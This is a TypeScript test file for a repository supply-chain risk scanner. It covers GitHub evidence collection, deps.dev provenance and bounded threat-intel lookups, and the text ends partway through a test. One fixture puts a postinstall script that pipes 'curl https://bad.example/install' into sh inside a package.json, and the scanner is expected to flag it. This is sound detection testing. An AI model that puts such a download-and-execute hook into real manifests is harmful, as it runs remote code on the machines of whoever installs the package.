import { describe, expect, test } from "bun:test";
import { GitHubRepositoryProvider } from "../src/providers/github-repository.ts";
import { DepsDevProvider, normalizeProvenance } from "../src/providers/deps-dev.ts";
import { RiskEngine } from "../src/domain/risk-engine.ts";
import { extractRiskFeatures, RISK_FEATURE_SCHEMA_VERSION } from "../src/domain/risk-features.ts";
import { RISK_SNAPSHOT_SCHEMA_VERSION, type RiskSnapshot } from "../src/domain/risk.ts";
import { partitionCompatibleRows, featuresEqual, featuresEqualForCohort } from "../src/domain/risk-evaluation.ts";
import { UpstreamHttp } from "../src/providers/http.ts";
import { CachedLoader, type Cache } from "../src/data/cache.ts";
import { OmniIntelligence, MAX_REPOSITORY_THREAT_FINDINGS_PER_PACKAGE, MAX_REPOSITORY_THREAT_FINDINGS_TOTAL, MAX_REPOSITORY_THREAT_INTEL_BYTES, MAX_REPOSITORY_THREAT_INTEL_ENTRY_BYTES, MAX_REPOSITORY_THREAT_INTEL_ERROR_ENTRIES, MAX_REPOSITORY_THREAT_INTEL_INDICATOR_BYTES, MAX_REPOSITORY_THREAT_INTEL_LIMITATION_ENTRIES, MAX_REPOSITORY_THREAT_INTEL_REFERENCE_BYTES, MAX_REPOSITORY_THREAT_INTEL_SOURCE_BYTES, MAX_REPOSITORY_THREAT_INTEL_THREAT_TYPE_BYTES } from "../src/services.ts";
import type { ScorecardProviderResult } from "../src/providers/scorecard.ts";
import { NoopAssessmentJournal, type AssessmentJournal } from "../src/data/assessment-journal.ts";
import type { ExactDependencyCoordinate, ProvenanceState, RiskAssessment, RepositoryEvidence, ThreatFinding } from "../src/domain/risk.ts";

function memoryCache(): Cache {
  const values = new Map<string, string>();
  return { async get(key) { return values.get(key) ?? null; }, async set(key, value) { values.set(key, value); } };
}

function fakeDepsDev(record: (coordinate: ExactDependencyCoordinate) => void): { packageVersion(coordinate: ExactDependencyCoordinate): Promise<{ observation: { coordinate: ExactDependencyCoordinate; licenses: string[]; advisoryIds: string[]; graph: { checked: boolean; nodeCount: number }; provenance: Array<{ package: ExactDependencyCoordinate; state: ProvenanceState; source: "deps.dev" }> }; evidence: { source: string; kind: string; observedAt: string; detail: Record<string, never> } }> } {
  return { async packageVersion(coordinate) {
    record(coordinate);
    return {
      observation: { coordinate, licenses: [], advisoryIds: [], graph: { checked: true, nodeCount: 1 }, provenance: [{ package: coordinate, state: "UNAVAILABLE", source: "deps.dev" }] },
      evidence: { source: "deps.dev", kind: "package_dependency_provenance", observedAt: "2026-01-01T00:00:00.000Z", detail: {} }
    };
  } };
}

const staticScorecard = { async repository() { return { status: "available" as const, score: 9.5, evidence: { source: "Scorecard", kind: "score", observedAt: "2026-01-01T00:00:00.000Z", detail: { score: 9.5 } } }; } };

function exactCoordinate(name: string, version = "1.0.0"): ExactDependencyCoordinate {
  return { ecosystem: "NPM", name, version, sourcePath: "package-lock.json", manifestPath: "package.json", workspacePath: "." };
}

function repositoryEvidenceWith(exact: ExactDependencyCoordinate[]): RepositoryEvidence {
  return {
    target: { repository: "github.com/acme/demo", requestedRef: "main", resolvedCommitSha: commitSha },
    securityFiles: [],
    dependencies: { exact, unresolved: [], resolvedGraph: { packagesChecked: 0, nodesObserved: 0, errors: [] } },
    dependencyObservations: [],
    dependencyThreatIntel: { status: "NOT_CHECKED", packagesInspected: [], findings: [], errors: [], limitations: [] },
    coverage: { status: "complete", treeEntriesInspected: 1, filesInspected: 1, bytesInspected: 10, limitations: [] },
    sourceErrors: []
  };
}

function threatIntelStore(lookup: (coordinate: ExactDependencyCoordinate) => Promise<{ checked: boolean; findings: ThreatFinding[] }>) {
  return {
    async lookupEndpoint() { return { checked: false, findings: [] }; },
    async lookupPackage(_ecosystem: string, name: string, version: string) { return lookup(exactCoordinate(name, version)); },
    async status() { return { available: true, configured: true, activeIndicators: 1, sources: 1 }; }
  };
}

function capturingJournal(snapshots: RiskSnapshot[]) {
  return {
    async record(snapshot: RiskSnapshot) { snapshots.push(structuredClone(snapshot)); return "assessment-id"; },
    async labelAssessment() {},
    async loadLabelled() { return []; }
  };
}

type ScorecardStub = { repository(): Promise<ScorecardProviderResult> };

function repositoryOmni(repositoryEvidence: RepositoryEvidence, threatIntel: ReturnType<typeof threatIntelStore>, journal: AssessmentJournal = new NoopAssessmentJournal(), scorecard: ScorecardStub = staticScorecard, githubOverride?: { resolve(): Promise<unknown>; collectResolved(): Promise<RepositoryEvidence> }, depsDevOverride?: ReturnType<typeof fakeDepsDev>) {
  const github = githubOverride ?? {
    async resolve() { return { repository: repositoryEvidence.target.repository, requestedRef: "main", resolvedCommitSha: commitSha, rootTreeSha: treeSha }; },
    async collectResolved() { return structuredClone(repositoryEvidence); }
  };
  const depsDev = depsDevOverride ?? fakeDepsDev(() => {});
  return new OmniIntelligence(new RiskEngine(), new CachedLoader(memoryCache()), {} as never, {} as never, scorecard as never, {} as never, {} as never, {} as never, {} as never, threatIntel as never, journal, github as never, depsDev as never);
}

async function repositoryObservation(repositoryEvidence: RepositoryEvidence, lookup: (coordinate: ExactDependencyCoordinate) => Promise<{ checked: boolean; findings: ThreatFinding[] }>) {
  const snapshots: RiskSnapshot[] = [];
  const assessment = await repositoryOmni(repositoryEvidence, threatIntelStore(lookup), capturingJournal(snapshots)).repositoryRisk("acme", "demo");
  return { assessment, snapshot: snapshots[0]! };
}

function evidenceOf(assessment: RiskAssessment): RepositoryEvidence {
  const snapshotEvidence = assessment.evidence.find(item => item.kind === "repository_primary_evidence");
  if (!snapshotEvidence) throw new Error("repository_primary_evidence missing");
  // The service records coverage/limitations/collector errors on the primary
  // evidence detail; read them from there instead of the assessment type.
  const detail = snapshotEvidence.detail as { repository?: string; resolvedCommitSha?: string; coverage?: "complete" | "partial"; limitations?: string[]; collectorErrors?: string[] };
  return {
    target: { repository: detail.repository ?? "", ...(detail.resolvedCommitSha ? { resolvedCommitSha: detail.resolvedCommitSha } : {}) },
    securityFiles: [],
    dependencies: { exact: [], unresolved: [], resolvedGraph: { packagesChecked: 0, nodesObserved: 0, errors: [] } },
    dependencyObservations: [],
    dependencyThreatIntel: { status: "NOT_CHECKED", packagesInspected: [], findings: [], errors: [], limitations: [] },
    coverage: { status: detail.coverage ?? "partial", treeEntriesInspected: 0, filesInspected: 0, bytesInspected: 0, limitations: detail.limitations ?? [] },
    sourceErrors: detail.collectorErrors ?? []
  };
}

function response(value: unknown, status = 200): Response {
  return new Response(JSON.stringify(value), { status, headers: { "content-type": "application/json" } });
}
function content(value: string) { return { encoding: "base64", content: Buffer.from(value).toString("base64") }; }

const commitSha = "0123456789abcdef0123456789abcdef01234567";
const treeSha = "abcdef0123456789abcdef0123456789abcdef01";
const packageBlob = "1111111111111111111111111111111111111111";
const workflowBlob = "2222222222222222222222222222222222222222";

async function realGithubEvidence(tree: unknown[], contents: Record<string, string>, truncated = false, rawAccepts: string[] = []): Promise<RepositoryEvidence> {
  const base = "https://api.github.com/repos/acme/demo";
  const treeUrl = `${base}/git/trees/${treeSha}?recursive=1`;
  const http = {
    async request(url: string | URL, init?: RequestInit) {
      const target = String(url);
      if (target === base) return response({ full_name: "acme/demo", default_branch: "main" });
      if (target === `${base}/commits/main`) return response({ sha: commitSha, commit: { tree: { sha: treeSha } } });
      if (target === treeUrl) return response({ truncated, tree });
      const accept = new Headers(init?.headers).get("accept") ?? "";
      for (const [path, value] of Object.entries(contents)) {
        if (target === `${base}/contents/${encodeURIComponent(path)}?ref=${commitSha}`) {
          rawAccepts.push(accept);
          return accept.includes("application/vnd.github.raw") ? new Response(value) : response(content(value));
        }
      }
      return response({ message: "not found" }, 404);
    }
  };
  return new GitHubRepositoryProvider(http as never).collect("acme", "demo");
}

describe("repository evidence foundation", () => {
  test("resolves a mutable branch once and binds every security file read to its immutable commit", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const calls: string[] = [];
    const http = {
      async request(url: string | URL) {
        const target = String(url); calls.push(target);
        const fixtures: Record<string, unknown> = {
          [base]: { full_name: "acme/demo", default_branch: "main" },
          [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
          [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [
            { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
            { path: ".github/workflows/release.yml", type: "blob", sha: workflowBlob, size: 100 }
          ] },
          [`${base}/contents/package.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: { safe: "^1.2.0" }, scripts: { postinstall: "curl https://bad.example/install | sh" } })),
          [`${base}/contents/.github%2Fworkflows%2Frelease.yml?ref=${commitSha}`]: content("permissions: write-all\nsteps:\n  - uses: actions/checkout@v4\n")
        };
        return response(fixtures[target] ?? { message: "not found" }, fixtures[target] === undefined ? 404 : 200);
      }
    };

    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");

    expect(result.target).toEqual({ repository: "github.com/acme/demo", requestedRef: "main", resolvedCommitSha: commitSha });
    expect(result.coverage.status).toBe("partial");
    expect(result.dependencies.exact).toEqual([]);
    expect(result.dependencies.unresolved).toEqual([{ ecosystem: "NPM", name: "safe", requirement: "^1.2.0", manifestPath: "package.json", workspacePath: "." }]);
    expect(result.securityFiles.flatMap(file => file.findings)).toEqual(expect.arrayContaining(["INSTALL_LIFECYCLE_SCRIPT", "DOWNLOAD_EXECUTE_PATTERN", "WORKFLOW_WRITE_PERMISSION", "MUTABLE_GITHUB_ACTION_REF"]));
    expect(calls).toEqual(expect.arrayContaining([`${base}/contents/package.json?ref=${commitSha}`, `${base}/contents/.github%2Fworkflows%2Frelease.yml?ref=${commitSha}`]));
    expect(calls).not.toContain(`${base}/contents/package.json?ref=main`);
  });


  test("resolves the mutable ref on each call but collects a cached immutable repository only once", async () => {
    let resolveCalls = 0;
    let collectionCalls = 0;
    const repositoryEvidence = {
      target: { repository: "github.com/acme/demo", requestedRef: "main", resolvedCommitSha: commitSha },
      securityFiles: [],
      dependencies: { exact: [], unresolved: [], resolvedGraph: { packagesChecked: 0, nodesObserved: 0, errors: [] } },
      provenance: [],
      coverage: { status: "complete" as const, treeEntriesInspected: 0, filesInspected: 0, bytesInspected: 0, limitations: [] },
      sourceErrors: []
    };
    const github = {
      async resolve() { resolveCalls += 1; return { repository: "github.com/acme/demo", requestedRef: "main", resolvedCommitSha: commitSha, rootTreeSha: treeSha }; },
      async collectResolved() { collectionCalls += 1; return structuredClone(repositoryEvidence); }
    };
    const values = new Map<string, string>();
    const cache: Cache = { async get(key) { return values.get(key) ?? null; }, async set(key, value) { values.set(key, value); } };
    const scorecard = { async repository() { return { status: "available" as const, score: 9.5, evidence: { source: "Scorecard", kind: "score", observedAt: "2026-01-01T00:00:00.000Z", detail: { score: 9.5 } } }; } };
    const omni = new OmniIntelligence(new RiskEngine(), new CachedLoader(cache), {} as never, {} as never, scorecard as never, {} as never, {} as never, {} as never, {} as never, {} as never, new NoopAssessmentJournal(), github as never, {} as never);

    await omni.repositoryRisk("acme", "demo");
    await omni.repositoryRisk("acme", "demo");

    expect(resolveCalls).toBe(2);
    expect(collectionCalls).toBe(1);
    expect([...values.keys()]).toEqual(["assessment:repo:omni-risk-v3:repository-coverage-v1:github.com/acme/demo:0123456789abcdef0123456789abcdef01234567"]);
  });

  test("marks tree truncation and oversized files partial instead of claiming clean coverage", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const http = { async request(url: string | URL) {
      const fixtures: Record<string, unknown> = {
        [base]: { full_name: "acme/demo", default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: true, tree: [{ path: "package.json", type: "blob", sha: packageBlob, size: 999_999 }] }
      };
      const target = String(url); return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");
    expect(result.coverage).toMatchObject({ status: "partial", limitations: expect.arrayContaining(["github_tree_truncated", "security_file_oversized:package.json"]) });
    expect(result.securityFiles).toEqual([{ path: "package.json", category: "manifest", status: "oversized", findings: [] }]);
  });

  test("derives exact npm coordinates only from Bun lock resolution evidence", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const bunBlob = "3333333333333333333333333333333333333333";
    const http = { async request(url: string | URL) {
      const target = String(url);
      const fixtures: Record<string, unknown> = {
        [base]: { full_name: "acme/demo", default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [{ path: "package.json", type: "blob", sha: packageBlob, size: 100 }, { path: "bun.lock", type: "blob", sha: bunBlob, size: 100 }] },
        [`${base}/contents/package.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: { safe: "^1.2.0" } })),
        [`${base}/contents/bun.lock?ref=${commitSha}`]: content(JSON.stringify({ lockfileVersion: 1, workspaces: { "": { dependencies: { safe: "^1.2.0" } } }, packages: { safe: ["safe@1.2.3", "", {}, "sha512-example"] }}))
      };
      return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");
    expect(result.dependencies.exact).toEqual([{ ecosystem: "NPM", name: "safe", version: "1.2.3", sourcePath: "bun.lock", manifestPath: "package.json", workspacePath: "." }]);
    expect(result.dependencies.unresolved).toEqual([]);
  });

  test("bounds deps.dev JSON bodies and disables redirects", async () => {
    const originalFetch = globalThis.fetch;
    const calls: RequestInit[] = [];
    globalThis.fetch = (async (_input, init) => {
      calls.push(init ?? {});
      return new Response(JSON.stringify({ ok: true }), { headers: { "content-type": "application/json" } });
    }) as typeof fetch;
    try {
      const http = new UpstreamHttp(1_000, 1, 1);
      await expect(http.boundedJson("https://api.deps.dev/example", 128)).resolves.toEqual({ ok: true });
      expect(calls[0]?.redirect).toBe("error");
      globalThis.fetch = (async () => new Response("0123456789", { headers: { "content-length": "10" } })) as unknown as typeof fetch;
      await expect(http.boundedJson("https://api.deps.dev/example", 4)).rejects.toThrow("upstream_response_oversized");
    } finally { globalThis.fetch = originalFetch; }
  });

  test("keeps deps.dev provenance states strict and source/commit mismatches visible", async () => {
    const urls: string[] = [];
    const http = { async boundedJson(url: string, _maximumBytes: number) { urls.push(url); return { licenses: ["MIT"], advisoryKeys: [{ id: "GHSA-example" }], slsaProvenances: [{ verified: true, sourceRepository: "github.com/acme/demo", commit: commitSha, url: "https://provenance.example/1" }] }; } };
    const observed = await new DepsDevProvider(http as never).packageVersion({ ecosystem: "NPM", name: "demo", version: "1.0.0", sourcePath: "package-lock.json", manifestPath: "package.json", workspacePath: "." }, { repository: "github.com/acme/demo", commit: commitSha });
    expect(urls).toContain("https://api.deps.dev/v3/systems/NPM/packages/demo/versions/1.0.0:dependencies");
    expect(observed.observation.provenance[0]).toMatchObject({ state: "VERIFIED", expectedSourceMatches: true, expectedCommitMatches: true });
    expect(normalizeProvenance({ verified: true, sourceRepository: "github.com/other/repo", commit: commitSha }, { repository: "github.com/acme/demo", commit: commitSha }).state).toBe("VERIFIED_SOURCE_MISMATCH");
    expect(normalizeProvenance({ verified: true, sourceRepository: "github.com/acme/demo", commit: "1111111111111111111111111111111111111111" }, { repository: "github.com/acme/demo", commit: commitSha }).state).toBe("VERIFIED_COMMIT_MISMATCH");
  });

  test("keeps repository dependency threat intel observation-only across checked, failed, and not-checked states", async () => {
    const baseline = new RiskEngine().assess({ subject: { type: "repository", id: "github.com/acme/demo" }, scorecard: 9.5, evidence: [{ source: "Scorecard", kind: "score", observedAt: "2026-08-26T00:00:00.000Z", detail: { score: 9.5 } }] });
    const coordinate = exactCoordinate("dangerous-package", "4.2.0");
    const finding: ThreatFinding = { indicatorType: "package", indicator: "npm:dangerous-package@4.2.0", threatType: "malicious_package", severity: "critical", source: "licensed-feed", reference: "https://intel.example/finding/1" };

    const checkedSnapshots: RiskSnapshot[] = [];
    const checked = await repositoryOmni(repositoryEvidenceWith([coordinate]), threatIntelStore(async () => ({ checked: true, findings: [finding] })), capturingJournal(checkedSnapshots)).repositoryRisk("acme", "demo");
    const checkedSnapshot = checkedSnapshots[0]!;
    const checkedObservation = checkedSnapshot.repositoryEvidence?.dependencyThreatIntel;
    expect({ riskScore: checked.riskScore, recommendation: checked.recommendation }).toEqual({ riskScore: baseline.riskScore, recommendation: baseline.recommendation });
    expect(checkedSnapshot).not.toHaveProperty("threatIntelChecked");
    expect(checkedSnapshot).not.toHaveProperty("threatFindings");
    expect(checkedSnapshot.sourceErrors ?? []).toEqual([]);
    expect(checkedObservation).toMatchObject({ status: "CHECKED", packagesInspected: [coordinate], findings: [{ coordinate, finding }], errors: [], limitations: [] });
    expect(checked.evidence.find(item => item.kind === "repository_dependency_ioc_lookup")?.detail).toMatchObject({ status: "CHECKED", packagesInspected: [coordinate], findings: [{ coordinate, finding }] });

    const failedSnapshots: RiskSnapshot[] = [];
    const failed = await repositoryOmni(repositoryEvidenceWith([coordinate]), threatIntelStore(async () => { throw new Error("feed_timeout"); }), capturingJournal(failedSnapshots)).repositoryRisk("acme", "demo");
    const failedSnapshot = failedSnapshots[0]!;
    expect({ riskScore: failed.riskScore, recommendation: failed.recommendation }).toEqual({ riskScore: baseline.riskScore, recommendation: "manual_review" });
    expect(failedSnapshot.sourceErrors ?? []).toEqual([]);
    expect(failedSnapshot.repositoryEvidence?.sourceErrors ?? []).toEqual([]);
    expect(failedSnapshot.repositoryEvidence?.dependencyThreatIntel).toMatchObject({ status: "UNAVAILABLE", packagesInspected: [coordinate], findings: [], errors: [`threat_intel NPM:${coordinate.name}@${coordinate.version}: feed_timeout`], limitations: [`threat_intel_lookup_failed:${coordinate.name}@${coordinate.version}`] });
    expect(failed.evidence.find(item => item.kind === "repository_dependency_ioc_lookup")?.detail).toMatchObject({ status: "UNAVAILABLE", errors: [`threat_intel NPM:${coordinate.name}@${coordinate.version}: feed_timeout`] });

    let zeroLookups = 0;
    const zeroSnapshots: RiskSnapshot[] = [];
    const zero = await repositoryOmni(repositoryEvidenceWith([]), threatIntelStore(async () => { zeroLookups += 1; return { checked: true, findings: [] }; }), capturingJournal(zeroSnapshots)).repositoryRisk("acme", "demo");
    expect({ riskScore: zero.riskScore, recommendation: zero.recommendation }).toEqual({ riskScore: baseline.riskScore, recommendation: baseline.recommendation });
    expect(zeroLookups).toBe(0);
    expect(zeroSnapshots[0]).not.toHaveProperty("threatIntelChecked");
    expect(zeroSnapshots[0]).not.toHaveProperty("threatFindings");
    expect(zeroSnapshots[0]?.repositoryEvidence?.dependencyThreatIntel).toMatchObject({ status: "NOT_CHECKED", packagesInspected: [], findings: [], errors: [], limitations: ["no_exact_dependencies_selected"] });
  });

  test("aggregates repository threat-intel coverage by lookup outcome", async () => {
    const coordinate = exactCoordinate("coverage-package", "1.0.0");
    const finding: ThreatFinding = { indicatorType: "package", indicator: "npm:coverage-package@1.0.0", threatType: "malicious_package", severity: "high", source: "licensed-feed", reference: "https://intel.example/coverage" };
    const coverage = async (lookup: (item: ExactDependencyCoordinate) => Promise<{ checked: boolean; findings: ThreatFinding[] }>) => {
      const assessment = await repositoryOmni(repositoryEvidenceWith([coordinate]), threatIntelStore(lookup)).repositoryRisk("acme", "demo");
      return assessment.coverage?.sources.find(source => source.source === "Threat Intelligence");
    };

    await expect(coverage(async () => ({ checked: true, findings: [] }))).resolves.toMatchObject({ execution: "QUERIED", status: "ABSENT" });
    await expect(coverage(async () => ({ checked: true, findings: [finding] }))).resolves.toMatchObject({ execution: "QUERIED", status: "OBSERVED" });
    await expect(coverage(async () => ({ checked: false, findings: [] }))).resolves.toMatchObject({ execution: "QUERIED", status: "UNAVAILABLE" });
    const mixedCoordinates = [coordinate, exactCoordinate("coverage-failing", "1.0.0")];
    const mixed = await repositoryOmni(repositoryEvidenceWith(mixedCoordinates), threatIntelStore(async item => item.name === coordinate.name ? { checked: true, findings: [] } : { checked: false, findings: [] })).repositoryRisk("acme", "demo");
    expect(mixed.coverage?.sources).toContainEqual({ source: "Threat Intelligence", execution: "QUERIED", status: "UNKNOWN", weight: 1 });

    const deferred = await repositoryOmni(repositoryEvidenceWith(Array.from({ length: 25 }, (_, index) => exactCoordinate(`coverage-deferred-${index}`))), threatIntelStore(async () => ({ checked: true, findings: [] }))).repositoryRisk("acme", "demo");
    expect(deferred.coverage?.sources).toContainEqual({ source: "Threat Intelligence", execution: "QUERIED", status: "UNKNOWN", weight: 1 });
  });

  test("bounds repository threat-intel lookups to four concurrent calls and twenty-four total calls", async () => {
    const coordinates = Array.from({ length: 30 }, (_, index) => exactCoordinate(`package-${String(index).padStart(2, "2")}`, `1.0.${index}`));
    const snapshots: RiskSnapshot[] = [];
    let active = 0;
    let maximumActive = 0;
    const calls: string[] = [];
    const threatIntel = threatIntelStore(async coordinate => {
      active += 1;
      maximumActive = Math.max(maximumActive, active);
      calls.push(`${coordinate.name}@${coordinate.version}`);
      await new Promise(resolve => setTimeout(resolve, 2));
      active -= 1;
      return { checked: true, findings: [] };
    });
    const result = await repositoryOmni(repositoryEvidenceWith(coordinates), threatIntel, capturingJournal(snapshots)).repositoryRisk("acme", "demo");
    const observation = snapshots[0]?.repositoryEvidence?.dependencyThreatIntel;
    expect(maximumActive).toBeLessThanOrEqual(4);
    expect(calls).toHaveLength(24);
    expect(observation?.status).toBe("CHECKED");
    expect(observation?.packagesInspected).toHaveLength(24);
    expect(result.riskScore).toBe(new RiskEngine().assess({ subject: { type: "repository", id: "github.com/acme/demo" }, scorecard: 9.5, evidence: [{ source: "Scorecard", kind: "score", observedAt: "2026-08-26T00:00:00.000Z", detail: { score: 9.5 } }] }).riskScore);

    const secondSnapshots: RiskSnapshot[] = [];
    const secondCalls: string[] = [];
    const secondThreatIntel = threatIntelStore(async coordinate => { secondCalls.push(`${coordinate.name}@${coordinate.version}`); return { checked: true, findings: [] }; });
    await repositoryOmni(repositoryEvidenceWith([...coordinates].reverse()), secondThreatIntel, capturingJournal(secondSnapshots)).repositoryRisk("acme", "demo");
    expect(secondCalls).toEqual(calls);
  });

  test("bounds findings per package and preserves an explicit truncation limitation", async () => {
    const coordinate = exactCoordinate("noisy-package", "1.0.0");
    const findings = Array.from({ length: MAX_REPOSITORY_THREAT_FINDINGS_PER_PACKAGE + 4 }, (_, index): ThreatFinding => ({ indicatorType: "package", indicator: `npm:noisy-package@1.0.0:${String(index).padStart(2, "0")}`, threatType: "suspicious", severity: index % 2 === 0 ? "high" : "low", source: "fixture", reference: `https://intel.example/${index}` }));
    const { snapshot } = await repositoryObservation(repositoryEvidenceWith([coordinate]), async () => ({ checked: true, findings }));
    const observation = snapshot.repositoryEvidence!.dependencyThreatIntel;
    expect(observation.findings).toHaveLength(MAX_REPOSITORY_THREAT_FINDINGS_PER_PACKAGE);
    expect(observation.limitations).toContain(`threat_intel_findings_truncated:NPM:noisy-package@1.0.0:${MAX_REPOSITORY_THREAT_FINDINGS_PER_PACKAGE}_of_${findings.length}`);
    expect(observation.status).toBe("CHECKED");
  });

  test("bounds total findings and selects a deterministic normalized set", async () => {
    const coordinates = Array.from({ length: 10 }, (_, index) => exactCoordinate(`package-${index}`, "1.0.0"));
    const findingsFor = (coordinate: ExactDependencyCoordinate): ThreatFinding[] => Array.from({ length: 8 }, (_, index) => ({ indicatorType: "package", indicator: `npm:${coordinate.name}@${coordinate.version}:${index}`, threatType: "known_bad", severity: index % 2 === 0 ? "critical" : "medium", source: "fixture", reference: `https://intel.example/${coordinate.name}/${index}` }));
    const first = await repositoryObservation(repositoryEvidenceWith(coordinates), async coordinate => ({ checked: true, findings: findingsFor(coordinate) }));
    const second = await repositoryObservation(repositoryEvidenceWith([...coordinates].reverse()), async coordinate => ({ checked: true, findings: findingsFor(coordinate).reverse() }));
    const left = first.snapshot.repositoryEvidence!.dependencyThreatIntel;
    const right = second.snapshot.repositoryEvidence!.dependencyThreatIntel;
    expect(left.findings).toHaveLength(MAX_REPOSITORY_THREAT_FINDINGS_TOTAL);
    expect(left.limitations).toContain(`threat_intel_total_findings_truncated:${MAX_REPOSITORY_THREAT_FINDINGS_TOTAL}_of_80`);
    expect(JSON.stringify(left)).toBe(JSON.stringify(right));
    expect(left.status).toBe("CHECKED");
  });

  test("deduplicates and normalizes findings independently of upstream response order", async () => {
    const coordinate = exactCoordinate("duplicate-package", "2.0.0");
    const finding: ThreatFinding = { indicatorType: "package", indicator: "npm:duplicate-package@2.0.0", threatType: "malicious", severity: "critical", source: "fixture", reference: "https://intel.example/duplicate" };
    const first = await repositoryObservation(repositoryEvidenceWith([coordinate]), async () => ({ checked: true, findings: [finding, finding, { ...finding, threatType: "advisory", severity: "high" }] }));
    const second = await repositoryObservation(repositoryEvidenceWith([coordinate]), async () => ({ checked: true, findings: [{ ...finding, threatType: "advisory", severity: "high" }, finding, finding] }));
    const left = first.snapshot.repositoryEvidence!.dependencyThreatIntel;
    const right = second.snapshot.repositoryEvidence!.dependencyThreatIntel;
    expect(left.findings).toHaveLength(2);
    expect(JSON.stringify(left)).toBe(JSON.stringify(right));
  });

  test("bounds every externally sourced finding string as valid UTF-8 and records limitations", async () => {
    const coordinate = exactCoordinate("long-fields", "3.0.0");
    const finding: ThreatFinding = { indicatorType: "package", indicator: "😀".repeat(2_000), threatType: "t".repeat(2_000), severity: "high", source: "s".repeat(2_000), reference: "https://intel.example/" + "r".repeat(4_000) };
    const { snapshot } = await repositoryObservation(repositoryEvidenceWith([coordinate]), async () => ({ checked: true, findings: [finding] }));
    const observation = snapshot.repositoryEvidence!.dependencyThreatIntel;
    const normalized = observation.findings[0]!.finding;
    expect(new TextEncoder().encode(normalized.indicator).byteLength).toBeLessThanOrEqual(MAX_REPOSITORY_THREAT_INTEL_INDICATOR_BYTES);
    expect(new TextEncoder().encode(normalized.threatType).byteLength).toBeLessThanOrEqual(MAX_REPOSITORY_THREAT_INTEL_THREAT_TYPE_BYTES);
    expect(new TextEncoder().encode(normalized.source).byteLength).toBeLessThanOrEqual(MAX_REPOSITORY_THREAT_INTEL_SOURCE_BYTES);
    expect(new TextEncoder().encode(normalized.reference!).byteLength).toBeLessThanOrEqual(MAX_REPOSITORY_THREAT_INTEL_REFERENCE_BYTES);
    expect(() => JSON.parse(JSON.stringify(observation))).not.toThrow();
    expect(observation.limitations).toContain("threat_intel_finding_field_truncated:NPM:long-fields@3.0.0");
  });

  test("keeps the complete normalized observation at or below the 64 KiB aggregate cap", async () => {
    const coordinates = Array.from({ length: 24 }, (_, index) => exactCoordinate(`oversized-${index}`, "1.0.0"));
    const findingsFor = (coordinate: ExactDependencyCoordinate): ThreatFinding[] => Array.from({ length: 24 }, (_, index) => ({ indicatorType: "package", indicator: `npm:${coordinate.name}@${coordinate.version}:${index}:` + "😀".repeat(600), threatType: "threat-type-" + "t".repeat(240), severity: index % 4 === 0 ? "critical" : "low", source: "source-" + "s".repeat(240), reference: "https://intel.example/" + "r".repeat(1_900) }));
    const { assessment, snapshot } = await repositoryObservation(repositoryEvidenceWith(coordinates), async coordinate => ({ checked: true, findings: findingsFor(coordinate) }));
    const observation = snapshot.repositoryEvidence!.dependencyThreatIntel;
    const serializedBytes = new TextEncoder().encode(JSON.stringify(observation)).byteLength;
    const evidenceDetail = assessment.evidence.find(item => item.kind === "repository_dependency_ioc_lookup")!.detail;
    const evidenceBytes = new TextEncoder().encode(JSON.stringify(evidenceDetail)).byteLength;
    expect(serializedBytes).toBeLessThanOrEqual(MAX_REPOSITORY_THREAT_INTEL_BYTES);
    expect(evidenceBytes).toBeLessThanOrEqual(MAX_REPOSITORY_THREAT_INTEL_BYTES);
    expect(() => JSON.parse(JSON.stringify(observation))).not.toThrow();
    expect(observation.status).toBe("CHECKED");
    expect(observation.findings.length).toBeLessThanOrEqual(MAX_REPOSITORY_THREAT_FINDINGS_TOTAL);
    expect(observation.limitations).toContain("threat_intel_payload_truncated");
  });

  test("bounds error and limitation entries while preserving overflow markers", async () => {
    const coordinates = Array.from({ length: 24 }, (_, index) => exactCoordinate(`failed-${index}`, "1.0.0"));
    const { snapshot } = await repositoryObservation(repositoryEvidenceWith(coordinates), async () => { throw new Error("provider-error-" + "x".repeat(10_000)); });
    const observation = snapshot.repositoryEvidence!.dependencyThreatIntel;
    const bytes = (value: string) => new TextEncoder().encode(value).byteLength;
    expect(observation.errors.length).toBeLessThanOrEqual(MAX_REPOSITORY_THREAT_INTEL_ERROR_ENTRIES);
    expect(observation.limitations.length).toBeLessThanOrEqual(MAX_REPOSITORY_THREAT_INTEL_LIMITATION_ENTRIES);
    expect(observation.errors.every(item => bytes(item) <= MAX_REPOSITORY_THREAT_INTEL_ENTRY_BYTES)).toBe(true);
    expect(observation.limitations.every(item => bytes(item) <= MAX_REPOSITORY_THREAT_INTEL_ENTRY_BYTES)).toBe(true);
    expect(observation.limitations.some(item => item.startsWith("threat_intel_errors_truncated:"))).toBe(true);
    expect(observation.limitations.some(item => item.startsWith("threat_intel_limitations_truncated:"))).toBe(true);
    expect(new TextEncoder().encode(JSON.stringify(observation)).byteLength).toBeLessThanOrEqual(MAX_REPOSITORY_THREAT_INTEL_BYTES);
    expect(observation.status).toBe("UNAVAILABLE");
  });

  test("absolutely caps zero-finding observations with pathological package coordinates", async () => {
    const coordinates = Array.from({ length: 24 }, (_, index) => ({
      ...exactCoordinate(`pathological-${index}`),
      sourcePath: `src/${"s".repeat(12_000)}-${index}`,
      manifestPath: `manifests/${"m".repeat(12_000)}-${index}`,
      workspacePath: `workspaces/${"w".repeat(12_000)}-${index}`
    }));
    const { assessment, snapshot } = await repositoryObservation(repositoryEvidenceWith(coordinates), async () => ({ checked: true, findings: [] }));
    const observation = snapshot.repositoryEvidence!.dependencyThreatIntel;
